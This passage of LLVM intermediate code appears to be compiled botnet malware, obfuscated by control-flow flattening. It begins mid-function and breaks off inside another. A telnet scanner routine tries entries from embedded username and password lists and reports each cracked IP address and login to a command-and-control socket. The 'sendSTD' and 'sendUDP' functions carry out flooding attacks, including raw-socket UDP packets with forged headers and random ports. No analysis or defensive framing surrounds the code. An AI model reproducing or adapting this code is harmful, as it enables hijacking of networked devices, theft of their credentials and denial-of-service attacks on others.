  %2220 = sext i32 %2219 to i64
  %.reload42 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload42, i64 %2220
  %2222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2221, i32 0, i32 5
  %2223 = load i8, i8* %2222, align 1
  %2224 = zext i8 %2223 to i64
  %2225 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2224
  %2226 = load i8*, i8** %2225, align 8
  %2227 = call i32 (i32, i8*, ...) @sockprintf(i32 %2202, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2210, i8* %2218, i8* %2226)
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:2228:                                   ; preds = %loopEntry
  %2229 = load i32, i32* %2, align 4
  %2230 = sext i32 %2229 to i64
  %.reload41 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload41, i64 %2230
  %2232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2231, i32 0, i32 0
  %2233 = load i32, i32* %2232, align 16
  %2234 = load i32, i32* %2, align 4
  %2235 = sext i32 %2234 to i64
  %.reload40 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload40, i64 %2235
  %2237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2236, i32 0, i32 8
  %2238 = load i8*, i8** %2237, align 8
  %2239 = load i32, i32* %2, align 4
  %2240 = sext i32 %2239 to i64
  %.reload39 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload39, i64 %2240
  %2242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2241, i32 0, i32 7
  %2243 = load i16, i16* %2242, align 16
  %2244 = zext i16 %2243 to i32
  %2245 = call i32 @readUntil(i32 %2233, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2238, i32 1024, i32 %2244)
  %2246 = icmp ne i32 %2245, 0
  %2247 = select i1 %2246, i32 1713615809, i32 764239783
  store i32 %2247, i32* %switchVar
  br label %loopEnd

; <label>:2248:                                   ; preds = %loopEntry
  %2249 = load i32, i32* %2, align 4
  %2250 = sext i32 %2249 to i64
  %.reload38 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload38, i64 %2250
  %2252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2251, i32 0, i32 6
  store i32 0, i32* %2252, align 4
  %2253 = load i32, i32* %2, align 4
  %2254 = sext i32 %2253 to i64
  %.reload37 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload37, i64 %2254
  %2256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2255, i32 0, i32 7
  store i16 0, i16* %2256, align 16
  %2257 = load i32, i32* %2, align 4
  %2258 = sext i32 %2257 to i64
  %.reload36 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload36, i64 %2258
  %2260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2259, i32 0, i32 0
  %2261 = load i32, i32* %2260, align 16
  %2262 = call i64 @send(i32 %2261, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2263 = load i32, i32* @mainCommSock, align 4
  %2264 = load i32, i32* %2, align 4
  %2265 = sext i32 %2264 to i64
  %.reload35 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload35, i64 %2265
  %2267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2266, i32 0, i32 1
  %2268 = bitcast i32* %2267 to %struct.in_addr*
  %2269 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2268, i32 0, i32 0
  %2270 = load i32, i32* %2269, align 4
  %2271 = call i8* @inet_ntoa(i32 %2270) #2
  %2272 = load i32, i32* %2, align 4
  %2273 = sext i32 %2272 to i64
  %.reload34 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload34, i64 %2273
  %2275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2274, i32 0, i32 4
  %2276 = load i8, i8* %2275, align 2
  %2277 = zext i8 %2276 to i64
  %2278 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2277
  %2279 = load i8*, i8** %2278, align 8
  %2280 = load i32, i32* %2, align 4
  %2281 = sext i32 %2280 to i64
  %.reload33 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload33, i64 %2281
  %2283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2282, i32 0, i32 5
  %2284 = load i8, i8* %2283, align 1
  %2285 = zext i8 %2284 to i64
  %2286 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2285
  %2287 = load i8*, i8** %2286, align 8
  %2288 = call i32 (i32, i8*, ...) @sockprintf(i32 %2263, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2271, i8* %2279, i8* %2287)
  %2289 = load i32, i32* %2, align 4
  %2290 = sext i32 %2289 to i64
  %.reload32 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload32, i64 %2290
  %2292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2291, i32 0, i32 8
  %2293 = load i8*, i8** %2292, align 8
  call void @llvm.memset.p0i8.i64(i8* %2293, i8 0, i64 1024, i32 1, i1 false)
  %2294 = load i32, i32* %2, align 4
  %2295 = sext i32 %2294 to i64
  %.reload31 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload31, i64 %2295
  %2297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2296, i32 0, i32 0
  %2298 = load i32, i32* %2297, align 16
  %2299 = call i32 @sclose(i32 %2298)
  %2300 = load i32, i32* %2, align 4
  %2301 = sext i32 %2300 to i64
  %.reload30 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload30, i64 %2301
  %2303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2302, i32 0, i32 3
  store i8 1, i8* %2303, align 1
  %2304 = load i32, i32* %2, align 4
  %2305 = sext i32 %2304 to i64
  %.reload29 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload29, i64 %2305
  %2307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2306, i32 0, i32 2
  store i8 0, i8* %2307, align 8
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:2308:                                   ; preds = %loopEntry
  %2309 = load i32, i32* %2, align 4
  %2310 = sext i32 %2309 to i64
  %.reload28 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload28, i64 %2310
  %2312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2311, i32 0, i32 8
  %2313 = load i8*, i8** %2312, align 8
  %2314 = call i64 @strlen(i8* %2313) #10
  %2315 = trunc i64 %2314 to i16
  %2316 = load i32, i32* %2, align 4
  %2317 = sext i32 %2316 to i64
  %.reload27 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload27, i64 %2317
  %2319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2318, i32 0, i32 7
  store i16 %2315, i16* %2319, align 16
  store i32 1229258361, i32* %switchVar
  br label %loopEnd

; <label>:2320:                                   ; preds = %loopEntry
  store i32 -535987874, i32* %switchVar
  br label %loopEnd

; <label>:2321:                                   ; preds = %loopEntry
  store i32 39259950, i32* %switchVar
  br label %loopEnd

; <label>:2322:                                   ; preds = %loopEntry
  %2323 = load i32, i32* %2, align 4
  %2324 = sext i32 %2323 to i64
  %.reload26 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload26, i64 %2324
  %2326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2325, i32 0, i32 6
  %2327 = load i32, i32* %2326, align 4
  %2328 = add i32 %2327, 10
  %2329 = zext i32 %2328 to i64
  %2330 = call i64 @time(i64* null) #2
  %2331 = icmp slt i64 %2329, %2330
  %2332 = select i1 %2331, i32 -1686291904, i32 842489912
  store i32 %2332, i32* %switchVar
  br label %loopEnd

; <label>:2333:                                   ; preds = %loopEntry
  %2334 = load i32, i32* %2, align 4
  %2335 = sext i32 %2334 to i64
  %.reload25 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload25, i64 %2335
  %2337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2336, i32 0, i32 0
  %2338 = load i32, i32* %2337, align 16
  %2339 = call i32 @sclose(i32 %2338)
  %2340 = load i32, i32* %2, align 4
  %2341 = sext i32 %2340 to i64
  %.reload24 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload24, i64 %2341
  %2343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2342, i32 0, i32 2
  store i8 0, i8* %2343, align 8
  %2344 = load i32, i32* %2, align 4
  %2345 = sext i32 %2344 to i64
  %.reload23 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload23, i64 %2345
  %2347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2346, i32 0, i32 3
  store i8 1, i8* %2347, align 1
  store i32 842489912, i32* %switchVar
  br label %loopEnd

; <label>:2348:                                   ; preds = %loopEntry
  store i32 -1568167552, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -1568167552, i32* %switchVar
  br label %loopEnd

; <label>:2349:                                   ; preds = %loopEntry
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:2350:                                   ; preds = %loopEntry
  %2351 = load i32, i32* %2, align 4
  %2352 = add nsw i32 %2351, 1
  store i32 %2352, i32* %2, align 4
  store i32 -237163149, i32* %switchVar
  br label %loopEnd

; <label>:2353:                                   ; preds = %loopEntry
  store i32 -2140852313, i32* %switchVar
  br label %loopEnd

; <label>:2354:                                   ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %2353, %2350, %2349, %NewDefault, %2348, %2333, %2322, %2321, %2320, %2308, %2248, %2228, %2187, %2167, %2126, %2106, %2099, %2091, %2060, %2045, %2036, %2031, %2016, %2007, %2002, %1987, %1978, %1977, %1962, %1951, %1939, %1933, %1928, %1908, %1891, %1871, %1865, %1860, %1840, %1823, %1803, %1797, %1792, %1772, %1755, %1735, %1729, %1724, %1704, %1687, %1667, %1661, %1656, %1636, %1619, %1599, %1593, %1588, %1568, %1551, %1531, %1525, %1520, %1500, %1483, %1463, %1457, %1452, %1432, %1423, %1403, %1386, %1366, %1360, %1355, %1335, %1326, %1306, %1289, %1269, %1262, %1254, %1249, %1234, %1225, %1210, %1184, %1183, %1168, %1157, %1145, %1130, %1121, %1106, %1097, %1082, %1073, %1058, %1049, %1034, %1025, %1010, %1001, %986, %977, %962, %953, %938, %929, %923, %918, %913, %896, %876, %870, %865, %860, %843, %823, %816, %808, %803, %788, %779, %764, %738, %737, %722, %711, %710, %709, %708, %707, %695, %690, %684, %679, %662, %642, %637, %631, %626, %609, %589, %584, %578, %573, %556, %536, %531, %525, %520, %503, %483, %478, %472, %467, %450, %430, %423, %415, %414, %399, %388, %387, %372, %368, %367, %336, %321, %310, %278, %277, %268, %267, %260, %252, %251, %242, %231, %226, %203, %202, %163, %162, %157, %148, %137, %122, %102, %89, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %NodeBlock7, %NodeBlock9, %LeafBlock11, %NodeBlock13, %NodeBlock15, %NodeBlock17, %NodeBlock19, %70, %65, %64, %63, %60, %57, %42, %37, %23, %21, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %7, align 4
  %13 = call i64 @time(i64* null) #2
  store i64 %13, i64* %8, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = call %struct.hostent* @gethostbyname(i8* %14)
  store %struct.hostent* %15, %struct.hostent** %10, align 8
  %16 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 4, i1 false)
  %17 = load %struct.hostent*, %struct.hostent** %10, align 8
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %17, i32 0, i32 4
  %19 = load i8**, i8*** %18, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %23 = bitcast %struct.in_addr* %22 to i8*
  %24 = load %struct.hostent*, %struct.hostent** %10, align 8
  %25 = getelementptr inbounds %struct.hostent, %struct.hostent* %24, i32 0, i32 3
  %26 = load i32, i32* %25, align 4
  %27 = sext i32 %26 to i64
  call void @bcopy(i8* %21, i8* %23, i64 %27) #2
  %28 = load %struct.hostent*, %struct.hostent** %10, align 8
  %29 = getelementptr inbounds %struct.hostent, %struct.hostent* %28, i32 0, i32 2
  %30 = load i32, i32* %29, align 8
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %31, i16* %32, align 4
  %33 = load i32, i32* %5, align 4
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 0, i32* %11, align 4
  %switchVar = alloca i32
  store i32 143617656, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 143617656, label %36
    i32 -70839137, label %40
    i32 502017574, label %53
    i32 1112750632, label %56
    i32 1199680278, label %57
    i32 11739944, label %60
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %11, align 4
  %38 = icmp uge i32 %37, 50
  %39 = select i1 %38, i32 -70839137, i32 1199680278
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %7, align 4
  %42 = call i64 @send(i32 %41, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i32 0, i32 0), i64 50, i32 0)
  %43 = load i32, i32* %7, align 4
  %44 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %45 = call i32 @connect(i32 %43, %struct.sockaddr* %44, i32 16)
  %46 = call i64 @time(i64* null) #2
  %47 = load i64, i64* %8, align 8
  %48 = load i32, i32* %6, align 4
  %49 = sext i32 %48 to i64
  %50 = add nsw i64 %47, %49
  %51 = icmp sge i64 %46, %50
  %52 = select i1 %51, i32 502017574, i32 1112750632
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %7, align 4
  %55 = call i32 @close(i32 %54)
  call void @_exit(i32 0) #12
  unreachable

; <label>:56:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 1199680278, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %11, align 4
  %59 = add i32 %58, 1
  store i32 %59, i32* %11, align 4
  store i32 143617656, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %57, %56, %40, %36, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  store i32 %29, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -91088820, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -91088820, label %first
    i32 -310357942, label %32
    i32 323785496, label %36
    i32 -273802801, label %41
    i32 419153662, label %47
    i32 1732510102, label %48
    i32 1271982131, label %55
    i32 -1647057715, label %60
    i32 -2110632814, label %63
    i32 -1387631552, label %71
    i32 639280458, label %72
    i32 298891106, label %84
    i32 -1879125375, label %95
    i32 2066760866, label %99
    i32 -1462382767, label %103
    i32 -1013049747, label %109
    i32 -1223872809, label %110
    i32 -2035594056, label %111
    i32 237617111, label %114
    i32 1850956770, label %115
    i32 -478237427, label %120
    i32 -1989630400, label %123
    i32 -141021582, label %129
    i32 1797228639, label %132
    i32 553448715, label %133
    i32 1434998763, label %138
    i32 -592682891, label %145
    i32 1184901304, label %149
    i32 -1503217342, label %150
    i32 -748584191, label %156
    i32 1415005238, label %196
    i32 1260044114, label %198
    i32 -761977493, label %203
    i32 467071504, label %230
    i32 1918113792, label %231
    i32 438423565, label %244
    i32 110703534, label %246
    i32 1984792165, label %251
    i32 -397420237, label %278
    i32 1757766816, label %284
    i32 1024569948, label %285
    i32 -1212522295, label %286
    i32 1237001243, label %289
    i32 -795663293, label %291
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %30 = icmp eq i32 %.reload, 0
  %31 = select i1 %30, i32 -310357942, i32 323785496
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = call i32 @rand_cmwc()
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 -273802801, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %8, align 4
  %38 = trunc i32 %37 to i16
  %39 = call zeroext i16 @htons(i16 zeroext %38) #13
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  store i32 -273802801, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %44 = call i32 @getHost(i8* %42, %struct.in_addr* %43)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 419153662, i32 1732510102
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 -795663293, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %50 = getelementptr inbounds [8 x i8], [8 x i8]* %49, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 8, i32 4, i1 false)
  %51 = load i32, i32* %12, align 4
  store i32 %51, i32* %14, align 4
  %52 = load i32, i32* %10, align 4
  %53 = icmp eq i32 %52, 32
  %54 = select i1 %53, i32 1271982131, i32 1850956770
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %56, i32* %15, align 4
  %57 = load i32, i32* %15, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 -2110632814, i32 -1647057715
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i32 0, i32 0))
  store i32 -795663293, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* %11, align 4
  %65 = add nsw i32 %64, 1
  %66 = sext i32 %65 to i64
  %67 = call noalias i8* @malloc(i64 %66) #2
  store i8* %67, i8** %16, align 8
  %68 = load i8*, i8** %16, align 8
  %69 = icmp eq i8* %68, null
  %70 = select i1 %69, i32 -1387631552, i32 639280458
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 -795663293, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i8*, i8** %16, align 8
  %74 = load i32, i32* %11, align 4
  %75 = add nsw i32 %74, 1
  %76 = sext i32 %75 to i64
  call void @llvm.memset.p0i8.i64(i8* %73, i8 0, i64 %76, i32 1, i1 false)
  %77 = load i8*, i8** %16, align 8
  %78 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %77, i32 %78)
  %79 = call i64 @time(i64* null) #2
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = add nsw i64 %79, %81
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %17, align 4
  store i32 0, i32* %18, align 4
  store i32 298891106, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %15, align 4
  %86 = load i8*, i8** %16, align 8
  %87 = load i32, i32* %11, align 4
  %88 = sext i32 %87 to i64
  %89 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %90 = call i64 @sendto(i32 %85, i8* %86, i64 %88, i32 0, %struct.sockaddr* %89, i32 16)
  %91 = load i32, i32* %18, align 4
  %92 = load i32, i32* %14, align 4
  %93 = icmp eq i32 %91, %92
  %94 = select i1 %93, i32 -1879125375, i32 -2035594056
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = load i32, i32* %8, align 4
  %97 = icmp eq i32 %96, 0
  %98 = select i1 %97, i32 2066760866, i32 -1462382767
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = call i32 @rand_cmwc()
  %101 = trunc i32 %100 to i16
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %101, i16* %102, align 2
  store i32 -1462382767, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = call i64 @time(i64* null) #2
  %105 = load i32, i32* %17, align 4
  %106 = sext i32 %105 to i64
  %107 = icmp sgt i64 %104, %106
  %108 = select i1 %107, i32 -1013049747, i32 -1223872809
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 237617111, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  store i32 298891106, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %18, align 4
  %113 = add i32 %112, 1
  store i32 %113, i32* %18, align 4
  store i32 298891106, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  store i32 -795663293, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %116, i32* %19, align 4
  %117 = load i32, i32* %19, align 4
  %118 = icmp ne i32 %117, 0
  %119 = select i1 %118, i32 -1989630400, i32 -478237427
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* @mainCommSock, align 4
  %122 = call i32 (i32, i8*, ...) @sockprintf(i32 %121, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i32 0, i32 0))
  store i32 -795663293, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  %124 = load i32, i32* %19, align 4
  %125 = bitcast i32* %20 to i8*
  %126 = call i32 @setsockopt(i32 %124, i32 0, i32 3, i8* %125, i32 4) #2
  %127 = icmp slt i32 %126, 0
  %128 = select i1 %127, i32 -141021582, i32 1797228639
  store i32 %128, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i32, i32* @mainCommSock, align 4
  %131 = call i32 (i32, i8*, ...) @sockprintf(i32 %130, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.83, i32 0, i32 0))
  store i32 -795663293, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  store i32 50, i32* %21, align 4
  store i32 553448715, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i32, i32* %21, align 4
  %135 = add nsw i32 %134, -1
  store i32 %135, i32* %21, align 4
  %136 = icmp ne i32 %134, 0
  %137 = select i1 %136, i32 1434998763, i32 -592682891
  store i32 %137, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  %139 = call i64 @time(i64* null) #2
  %140 = call i32 @rand_cmwc()
  %141 = zext i32 %140 to i64
  %142 = xor i64 %139, %141
  %143 = trunc i64 %142 to i32
  call void @srand(i32 %143) #2
  %144 = call i32 @rand() #2
  call void @init_rand(i32 %144)
  store i32 553448715, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i32, i32* %10, align 4
  %147 = icmp eq i32 %146, 0
  %148 = select i1 %147, i32 1184901304, i32 -1503217342
  store i32 %148, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  store i32 0, i32* %22, align 4
  store i32 -748584191, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i32, i32* %10, align 4
  %152 = sub nsw i32 32, %151
  %153 = shl i32 1, %152
  %154 = sub nsw i32 %153, 1
  %155 = xor i32 %154, -1
  store i32 %155, i32* %22, align 4
  store i32 -748584191, i32* %switchVar
  br label %loopEnd

; <label>:156:                                    ; preds = %loopEntry
  %157 = load i32, i32* %11, align 4
  %158 = sext i32 %157 to i64
  %159 = add i64 28, %158
  store i64 %159, i64* %.reg2mem2
  %160 = call i8* @llvm.stacksave()
  store i8* %160, i8** %23, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %161 = alloca i8, i64 %.reload4, align 16
  store i8* %161, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %162 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %162, %struct.iphdr** %24, align 8
  %163 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %164 = bitcast %struct.iphdr* %163 to i8*
  %165 = getelementptr i8, i8* %164, i64 20
  %166 = bitcast i8* %165 to %struct.udphdr*
  store %struct.udphdr* %166, %struct.udphdr** %25, align 8
